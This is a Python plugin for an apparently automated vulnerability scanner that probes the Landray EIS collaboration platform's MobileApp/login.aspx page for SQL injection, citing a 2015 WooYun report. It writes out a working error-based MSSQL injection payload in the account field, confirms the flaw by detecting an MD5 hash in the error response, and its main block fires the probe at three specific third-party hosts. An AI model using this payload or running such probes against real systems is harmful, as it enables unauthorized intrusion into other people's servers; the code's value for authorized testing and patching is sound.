#!/usr/bin/env python
# -*- coding: utf-8 -*-
#__Author__ = b2zer0
#_PlugName_ = 蓝凌EIS智慧协同平台 /MobileApp/login.aspx 注入漏洞
#references:'http://wooyun.org/bugs/wooyun-2015-0157501
import re

def assign(service, arg):
    if service == "landray":
        return True, arg

def audit(arg):
    login_url = arg+'MobileApp/login.aspx'
    code, head,res, errcode, _   = curl.curl2(login_url)
    regex=re.compile(r'<input type="hidden" name="__VIEWSTATE" id="__VIEWSTATE" value="(.+?)"')
    viewstate=regex.findall(res)[0]
    data = '__VIEWSTATE='+viewstate+"&account=1%27and+1%3Dconvert(int,sys.fn_varbintohexstr(hashbytes('MD5','321')))--&password="
    header = 'Content-Type: application/x-www-form-urlencoded'
    code, head,res, errcode, _   = curl.curl2(login_url,header=header,post=data)
    if  code ==  500  and 'caf1a3dfb505ffed0d024130f58c5cfa' in res:
        security_hole(login_url+'\npost:'+data)

if __name__ == '__main__':
    from dummy import *
    audit(assign('landray','http://oa.eyeis.com:888/')[1])
    audit(assign('landray','http://eip.zsdaxin.com:88/')[1])
    audit(assign('landray','http://oa.myzygroup.com/')[1])